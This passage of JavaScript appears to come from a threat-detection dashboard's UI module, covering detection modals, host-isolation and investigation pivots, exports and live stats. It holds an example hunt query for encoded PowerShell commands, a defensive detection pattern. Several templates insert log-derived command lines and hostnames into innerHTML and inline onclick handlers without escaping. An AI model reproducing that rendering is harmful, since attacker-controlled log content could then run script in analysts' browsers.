      <div style="font-size:10px;color:#60a5fa;font-weight:700;text-transform:uppercase;letter-spacing:.4px;margin-bottom:6px;">Analysis Narrative</div>
      <div style="font-size:12px;color:#e6edf3;line-height:1.5;">${det.narrative||det.description}</div>
    </div>` : ''}

    ${det.commandLine ? `<div style="margin-bottom:14px;">
      <div style="font-size:11px;color:#6b7280;font-weight:600;text-transform:uppercase;letter-spacing:.4px;margin-bottom:6px;">Command Line</div>
      <div class="rk-code" style="background:#0d1117;padding:12px;border-radius:6px;border:1px solid #21262d;font-size:11px;color:#34d399;word-break:break-all;">${det.commandLine}</div>
    </div>` : ''}

    ${mitreText ? `<div style="margin-bottom:14px;">
      <div style="font-size:11px;color:#6b7280;font-weight:600;text-transform:uppercase;letter-spacing:.4px;margin-bottom:6px;">MITRE ATT&amp;CK</div>
      <div style="display:flex;gap:6px;flex-wrap:wrap;">${mitreText}</div>
    </div>` : ''}

    ${isAgg && det.variants_triggered && det.variants_triggered.length > 1 ? `
    <div style="margin-bottom:14px;">
      <div style="font-size:11px;color:#6b7280;font-weight:600;text-transform:uppercase;letter-spacing:.4px;margin-bottom:6px;">Variants Triggered (${det.variants_triggered.length})</div>
      <div style="display:flex;gap:4px;flex-wrap:wrap;">
        ${det.variants_triggered.map(v => `<span class="rk-tag" style="color:#a78bfa;font-size:10px;">${v}</span>`).join('')}
      </div>
    </div>` : ''}

    <div style="margin-bottom:14px;">
      <div style="font-size:11px;color:#6b7280;font-weight:600;text-transform:uppercase;letter-spacing:.4px;margin-bottom:6px;">Tags</div>
      <div style="display:flex;gap:4px;flex-wrap:wrap;">
        ${(det.tags||[]).map(t => `<span class="rk-tag">${t}</span>`).join('')||'<span class="rk-tag">—</span>'}
        <span class="rk-tag" style="color:#4b5563;">Rule: ${det.ruleId||det.id||'?'}</span>
      </div>
    </div>

    ${allEvidence.length ? `<div style="margin-bottom:14px;">
      <div style="font-size:11px;color:#6b7280;font-weight:600;text-transform:uppercase;letter-spacing:.4px;margin-bottom:6px;">
        Raw Evidence Events (${allEvidence.length}${allEvidence.length > 10 ? ', showing first 10' : ''})
      </div>
      <div style="max-height:220px;overflow-y:auto;display:flex;flex-direction:column;gap:4px;">
        ${allEvidence.slice(0,10).map(ev => `<div class="rk-code" style="font-size:10px;padding:6px 10px;background:#0d1117;border-radius:4px;border:1px solid #21262d;color:#8b949e;">
          <span style="color:#60a5fa;">EID ${ev.EventID||ev.eventId||'?'}</span> ·
          ${ev.Computer||ev.computer||'?'} ·
          <span style="color:#34d399;">${ev.User||ev.user||'?'}</span>
          ${ev.SourceIP||ev.srcIp ? '<span style="color:#f59e0b;"> from '+(ev.SourceIP||ev.srcIp)+'</span>' : ''}
          ${ev.CommandLine||ev.commandLine ? '<br/><span style="color:#a78bfa;">'+(ev.CommandLine||ev.commandLine)+'</span>' : ''}
        </div>`).join('')}
      </div>
    </div>` : ''}

    <div style="margin-top:14px;display:flex;gap:8px;flex-wrap:wrap;">
      <button class="rk-btn rk-btn-ghost" style="font-size:11px;"
        onclick="RAYKAN_UI._invEntity('${det.computer||det.host||det.user||''}');this.closest('.rk-modal-overlay').remove()">
        Investigate Entity
      </button>
      <button class="rk-btn rk-btn-ghost" style="font-size:11px;"
        onclick="RAYKAN_UI._setTab('chains');this.closest('.rk-modal-overlay').remove()">
        Attack Chains
      </button>
      <button class="rk-btn rk-btn-ghost" style="font-size:11px;"
        onclick="RAYKAN_UI._setTab('timeline');this.closest('.rk-modal-overlay').remove()">
        Timeline
      </button>
    </div>
  </div>
</div>`;
    document.body.appendChild(overlay);
  }

  function _detField(label, value) {
    return `<div>
  <div style="font-size:10px;color:#4b5563;font-weight:600;text-transform:uppercase;letter-spacing:.4px;margin-bottom:4px;">${label}</div>
  <div style="font-size:13px;color:#e6edf3;">${value||'—'}</div>
</div>`;
  }

  function _invEntity(entity) {
    if (!entity) return;
    S.investigateEntity = entity;
    _setTab('investigate');
    setTimeout(() => {
      const el = document.getElementById('rk-inv-entity');
      if (el) el.value = entity;
      _runInvestigation(entity);
    }, 100);
  }

  // ── BCE v10: Toggle stage detail panel in attack chain flow ────
  function _toggleStageDetail(incId, stageIdx) {
    const panel = document.getElementById(`rk-stage-${incId}-${stageIdx}`);
    if (!panel) return;
    const isOpen = panel.style.display !== 'none';
    // Close all other stage panels in this incident
    const container = document.getElementById(`rk-stage-details-${incId}`);
    if (container) {
      container.querySelectorAll('[id^="rk-stage-"]').forEach(p => {
        if (p !== panel) { p.style.display = 'none'; p.classList.remove('rk-stage-detail-open'); }
      });
    }
    panel.style.display = isOpen ? 'none' : 'block';
    if (!isOpen) {
      panel.classList.remove('rk-stage-detail-open');
      void panel.offsetWidth;
      panel.classList.add('rk-stage-detail-open');
      panel.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    }
  }

  // ── BCE v10: Open MITRE ATT&CK technique page ─────────────────
  function _openMITRE(technique) {
    if (!technique) return;
    const base = 'https://attack.mitre.org/techniques/';
    const path = technique.replace('.', '/');
    window.open(base + path, '_blank', 'noopener');
  }

  // ── BCE v10: Isolate host (placeholder — triggers investigation) ─
  function _isolateHost(host) {
    if (!host) return;
    const msg = `Host isolation initiated for: ${host}\n\nIn production, this would:\n• Block all inbound/outbound traffic\n• Quarantine the endpoint\n• Notify the SOC team`;
    if (typeof _showToast === 'function') {
      _showToast(`🔒 Isolation request sent for ${host}`, 'warning');
    }
    // Also open investigation
    _invEntity(host);
  }

  // ── BCE v10: Pivot to logs for an incident ────────────────────
  function _pivotToLogs(incidentId) {
    if (!incidentId) return;
    _setTab('timeline');
    setTimeout(() => {
      const filter = document.getElementById('rk-tl-filter');
      if (filter) filter.value = 'detection';
      if (typeof _filterTimeline === 'function') _filterTimeline();
      if (typeof _showToast === 'function') {
        _showToast(`Showing logs for incident ${incidentId}`, 'info');
      }
    }, 200);
  }

  // ── BCE v10: Lookup IOC value ──────────────────────────────────
  function lookupIOCVal(val) {
    if (!val) return;
    _setTab('ioc');
    setTimeout(() => {
      const el = document.getElementById('rk-ioc-in');
      if (el) {
        el.value = val;
        if (typeof lookupIOC === 'function') lookupIOC();
      }
    }, 200);
  }

  // ════════════════════════════════════════════════════════════════
  //  HUNT MODE TOGGLE
  // ════════════════════════════════════════════════════════════════
  function _setHuntMode(mode) {
    S.huntMode = mode;
    const rqlBtn = document.getElementById('rk-h-rql');
    const nlBtn  = document.getElementById('rk-h-nl');
    const inp    = document.getElementById('rk-h-input');
    if (rqlBtn) { rqlBtn.style.color = mode==='rql' ? '#60a5fa' : ''; rqlBtn.style.borderColor = mode==='rql' ? '#60a5fa' : ''; }
    if (nlBtn)  { nlBtn.style.color  = mode==='nl'  ? '#60a5fa' : ''; nlBtn.style.borderColor  = mode==='nl'  ? '#60a5fa' : ''; }
    if (inp)    inp.placeholder = mode==='nl' ?
      'Find all PowerShell encoded commands in the last 24 hours…' :
      'process.name:"powershell.exe" AND commandLine:*EncodedCommand*';
  }

  // ════════════════════════════════════════════════════════════════
  //  FILTERS & SEARCH
  // ════════════════════════════════════════════════════════════════
  function _filterDetections() {
    const sev = document.getElementById('rk-det-sev')?.value || '';
    const filtered = sev ? S.detections.filter(d => d.severity === sev) : S.detections;
    _renderDetectionsList(filtered);
  }

  function _searchDetections() {
    const q   = document.getElementById('rk-det-search')?.value?.toLowerCase() || '';
    const sev = document.getElementById('rk-det-sev')?.value || '';
    const filtered = S.detections.filter(d =>
      (!sev || d.severity === sev) &&
      (!q   || (d.ruleName||d.title||'').toLowerCase().includes(q) ||
               (d.computer||d.host||'').toLowerCase().includes(q) ||
               (d.user||'').toLowerCase().includes(q))
    );
    _renderDetectionsList(filtered);
  }

  function _filterTimeline() {
    const type = document.getElementById('rk-tl-filter')?.value || '';
    const filtered = type ? S.timeline.filter(e => e.type === type) : S.timeline;
    const el = document.getElementById('rk-tl-container');
    const tmp = S.timeline;
    S.timeline = filtered;
    _renderTimelineList(filtered);
    S.timeline = tmp;
  }

  // ════════════════════════════════════════════════════════════════
  //  EXPORT
  // ════════════════════════════════════════════════════════════════
  function exportResults() {
    const data = {
      session    : S.sessionId,
      riskScore  : S.riskScore,
      generatedAt: new Date().toISOString(),
      detections : S.detections,
      timeline   : S.timeline,
      chains     : S.chains,
      anomalies  : S.anomalies,
    };
    _downloadJSON(data, `raykan-results-${Date.now()}.json`);
    _showToast('Results exported as JSON', 'success');
  }

  function _exportDetections() {
    const csv = ['Severity,Rule,Host,User,MITRE,RiskScore,Time',
      ...S.detections.map(d => [d.severity, `"${d.ruleName||''}"`, d.computer||d.host||'', d.user||'',
        d.mitre?.technique||'', d.riskScore||'', new Date(d.timestamp).toISOString()].join(','))
    ].join('\n');
    _downloadText(csv, `raykan-detections-${Date.now()}.csv`, 'text/csv');
    _showToast('Detections exported as CSV', 'success');
  }

  function _exportTimeline() {
    const csv = ['Time,Type,Entity,Description',
      ...S.timeline.map(e => [new Date(e.timestamp||e.ts).toISOString(), e.type||'', e.entity||'', `"${e.description||''}"`].join(','))
    ].join('\n');
    _downloadText(csv, `raykan-timeline-${Date.now()}.csv`, 'text/csv');
    _showToast('Timeline exported as CSV', 'success');
  }

  function _exportHuntCSV() {
    if (!S.huntResults?.matches) return;
    const csv = ['Time,Host,User,Process,Command',
      ...S.huntResults.matches.map(m => [
        new Date(m.timestamp).toISOString(), m.computer||m.host||'',
        m.user||'', m.process||'', `"${(m.commandLine||'').replace(/"/g,'""')}"`].join(','))
    ].join('\n');
    _downloadText(csv, `raykan-hunt-${Date.now()}.csv`, 'text/csv');
    _showToast('Hunt results exported as CSV', 'success');
  }

  function _downloadJSON(obj, name) {
    _downloadText(JSON.stringify(obj, null, 2), name, 'application/json');
  }

  function _downloadText(text, name, type='text/plain') {
    const a = document.createElement('a');
    a.href  = URL.createObjectURL(new Blob([text], { type }));
    a.download = name;
    a.click();
  }

  // ════════════════════════════════════════════════════════════════
  //  STATS & REALTIME
  // ════════════════════════════════════════════════════════════════
  function _updateStats(result) {
    // Flash stat cards when values change
    function _flashStat(id) {
      const el = document.getElementById(id);
      if (!el) return;
      const stat = el.closest('.rk-stat');
      if (stat) { stat.classList.remove('flashed'); void stat.offsetWidth; stat.classList.add('flashed'); }
      el.classList.remove('updated'); void el.offsetWidth; el.classList.add('updated');
    }
    const setAnimated = (id, newVal) => {
      const el = document.getElementById(id);
      if (!el) return;
      const old = el.textContent;
      el.textContent = newVal;
      if (old !== String(newVal)) {
        el.classList.remove('updated');
        void el.offsetWidth; // reflow
        el.classList.add('updated');
      }
    };
    setAnimated('rk-s-events',    (result.processed||0).toLocaleString());
    setAnimated('rk-s-dets',      S.detections.length.toLocaleString());
    setAnimated('rk-s-anom',      S.anomalies.length.toLocaleString());
    setAnimated('rk-s-chains',    S.chains.length.toLocaleString());
    setAnimated('rk-s-incidents', (S.incidents||[]).length.toLocaleString());
    setAnimated('rk-s-risk',      S.riskScore || '—');
    // Flash stat card backgrounds on update
    ['rk-s-events','rk-s-dets','rk-s-anom','rk-s-chains','rk-s-incidents','rk-s-risk'].forEach(_flashStat);
    const set = (id, v) => { const el=document.getElementById(id); if(el) el.textContent=v; };
    set('rk-last-upd',    S.lastUpdated?.toLocaleTimeString() || '—');
    set('rk-session-id',  S.sessionId ? S.sessionId.slice(0,8)+'…' : '—');

    const badge = document.getElementById('rk-risk-badge');
    if (badge) {
      const r = S.riskScore;
      badge.className = 'rk-risk-badge'; // reset
      if      (r >= 80) { badge.style.color='#ef4444'; badge.style.borderColor='rgba(239,68,68,0.45)'; badge.style.background='rgba(239,68,68,0.10)'; badge.className += ' risk-critical'; }
      else if (r >= 60) { badge.style.color='#f97316'; badge.style.borderColor='rgba(249,115,22,0.45)'; badge.style.background='rgba(249,115,22,0.10)'; badge.className += ' risk-high'; }
      else if (r >= 40) { badge.style.color='#eab308'; badge.style.borderColor='rgba(234,179,8,0.40)';  badge.style.background='rgba(234,179,8,0.08)';  badge.className += ' risk-medium'; }
      else if (r > 0)   { badge.style.color='#22c55e'; badge.style.borderColor='rgba(34,197,94,0.35)';  badge.style.background='rgba(34,197,94,0.08)';  badge.className += ' risk-low'; }
      else              { badge.style.color='#6b7280'; badge.style.borderColor='rgba(107,114,128,0.20)'; badge.style.background='rgba(107,114,128,0.06)'; }
      badge.innerHTML = `RISK: <span id="rk-risk-badge-val" style="font-size:13px;font-weight:900;">${r||'—'}</span>`;
    }
  }

  async function _loadStats() {
    try {
      const r = await _api('GET', '/stats');
      const s = r.stats || r;
      const set = (id, v) => { const el=document.getElementById(id); if(el) el.textContent=v; };
      set('rk-s-rules',     s.rulesLoaded||0);
      set('rk-sigma-rules', s.rulesLoaded||0);
      set('rk-ai-prov',     r.subEngines?.ai?.provider||'none');
      set('rk-ueba-prof',   r.subEngines?.ueba?.profiles||0);
      set('rk-chains-cnt',  s.chainsBuilt||0);
      set('rk-uptime-val',  s.uptime||0);
      set('rk-buffer-val',  s.bufferSize||0);

      // Engine health dots
      const healthEl = document.getElementById('rk-engine-health');
      if (healthEl) {
        const engines = [
          ['Sigma', r.subEngines?.sigma?.active !== false],
          ['AI',    r.subEngines?.ai?.active !== false],
          ['UEBA',  r.subEngines?.ueba?.active !== false],
          ['DFIR',  r.subEngines?.forensics?.active !== false],
        ];
        healthEl.innerHTML = engines.map(([name, ok]) =>
          `<span style="display:flex;align-items:center;gap:4px;font-size:11px;color:${ok?'#34d399':'#6b7280'};">
            <span style="width:6px;height:6px;border-radius:50%;background:${ok?'#34d399':'#4b5563'};"></span>${name}
          </span>`).join('');
      }
    } catch(e) { /* backend not yet initialized */ }
  }

  function _onRealtimeDetection(det) {
    // Deduplicate realtime detection against existing session detections
    S.detections = CSDE.mergeDetections(S.detections, [det]);
    _updateStats({});
    if (S.activeTab === 'detections') _renderDetectionsList(S.detections);
    if (S.activeTab === 'overview')   _renderOverviewContent();
    _showToast(`🚨 ${det.ruleName||'Detection'} — ${det.severity?.toUpperCase()}`, det.severity === 'critical' ? 'error' : 'warning');
  }

  function _onRealtimeAnomaly(a) {
    S.anomalies.unshift(a);
    _updateStats({});
    if (S.activeTab === 'anomalies') _renderAnomaliesList(S.anomalies);
  }

  function _onRealtimeChain(c) {
    S.chains.unshift(c);
    _updateStats({});
    if (S.activeTab === 'chains') _renderChainsList(S.chains);
  }

  // ════════════════════════════════════════════════════════════════
  //  HELPERS
  // ════════════════════════════════════════════════════════════════
  function _riskColor(score) {
    if (score >= 80) return '#ef4444';
    if (score >= 60) return '#f97316';
    if (score >= 40) return '#eab308';
    if (score > 0)   return '#22c55e';
    return '#2d4a5a';
  }

  function _riskClass(score) {
    if (score >= 80) return 'rk-risk-critical';
    if (score >= 60) return 'rk-risk-high';
    if (score >= 40) return 'rk-risk-medium';
    if (score > 0)   return 'rk-risk-low';
    return 'rk-risk-clean';
  }

  function _spinner(msg='Processing…') {
    return `<div style="text-align:center;padding:50px;color:#2d4a5a;">
  <div style="position:relative;width:44px;height:44px;margin:0 auto 16px;">
    <!-- Outer ring -->
    <div style="position:absolute;inset:0;border-radius:50%;
      border:2px solid rgba(0,212,255,0.08);border-top-color:#00d4ff;
      animation:rk3-spin 0.8s linear infinite;
      box-shadow:0 0 20px rgba(0,212,255,0.25);"></div>
    <!-- Inner ring (reverse) -->
    <div style="position:absolute;inset:8px;border-radius:50%;
      border:1.5px solid rgba(0,212,255,0.06);border-bottom-color:rgba(0,212,255,0.4);
      animation:rk3-spin-reverse 1.2s linear infinite;"></div>
    <!-- Center dot -->
    <div style="position:absolute;inset:17px;border-radius:50%;
      background:rgba(0,212,255,0.6);
      box-shadow:0 0 8px rgba(0,212,255,0.8);
      animation:rk3-glow-pulse 1s ease-in-out infinite;"></div>
  </div>
  <div style="font-size:11px;font-family:'JetBrains Mono',monospace;
    letter-spacing:1px;color:#1d3d50;animation:rk3-blink 1.2s step-end infinite;">${msg}</div>
</div>`;
  }

  function _updateWSBadge() {
    const dot   = document.getElementById('rk-ws-dot');
    const lbl   = document.getElementById('rk-ws-lbl');
    const badge = document.getElementById('rk-ws-badge');
    if (dot)   dot.style.background  = S.wsConnected ? '#34d399' : '#1a3040';
    if (dot && S.wsConnected) { dot.style.boxShadow = '0 0 8px rgba(52,211,153,0.8)'; dot.style.animation = 'rk-pulse 2s ease-in-out infinite'; }
    if (lbl)   lbl.textContent       = S.wsConnected ? 'Live' : 'Offline';
    if (badge) badge.className       = 'rk-ws-badge' + (S.wsConnected ? ' connected' : '');
  }

  function _showToast(msg, type='info') {
    const root = document.getElementById('rk-toast-root');
    if (!root) return;
    const icons    = { success:'✓', error:'✗', warning:'⚠', info:'ℹ' };
    const classes  = { success:'rk-toast-success', error:'rk-toast-error', warning:'rk-toast-warning', info:'rk-toast-info' };
    const toast    = document.createElement('div');
    toast.className = `rk-toast ${classes[type] || classes.info}`;
    toast.style.pointerEvents = 'all';
    toast.innerHTML = `<span style="font-size:14px;flex-shrink:0;">${icons[type]||'ℹ'}</span><span>${msg}</span>`;
    root.appendChild(toast);
    setTimeout(() => {
      toast.classList.add('fade-out');
      setTimeout(() => toast.remove(), 320);
    }, 4500);
  }

  function _attachEvents() {
    // Keyboard shortcuts
    document.addEventListener('keydown', (e) => {
      if (!document.getElementById('rk-root')) return;
      if (e.ctrlKey && e.key === 'Enter' && S.activeTab === 'hunt') executeHunt();
    });
  }

  // ════════════════════════════════════════════════════════════════
  //  PUBLIC API
  // ════════════════════════════════════════════════════════════════
  const RAYKAN_UI = {
    render,
    runSample,
    executeHunt,
    lookupIOC,
    lookupIOCBatch,
    investigate,
    generateRule,
    ingestPasted,
    exportResults,
    _setTab,
    _setHuntMode,
    _filterDetections,
    _searchDetections,
    _filterTimeline,
    _exportDetections,
    _exportTimeline,
    _exportHuntCSV,
    _handleFileUpload,
    _loadRules,
    _loadMITRE,
    _showDetDetail,
    _invEntity,
    _toggleStageDetail,
    _openMITRE,
    _isolateHost,
    _pivotToLogs,
    lookupIOCVal,
    _activateGeneratedRule,
    _renderIncidentsList,
    _renderIncidentCard,
    getState: () => S,
  };

  // Expose globally
  window.RAYKAN_UI     = RAYKAN_UI;
  window.CSDE          = CSDE; // Expose CSDE for testing and external access
  window.renderRAYKAN  = () => {
    const wrap = document.getElementById('raykanWrap');
    if (wrap) render(wrap);
  };

  console.log(`[RAYKAN UI v${RAYKAN_VERSION}] Module loaded — ${Object.keys(RAYKAN_UI).length} exports`);

})(window);
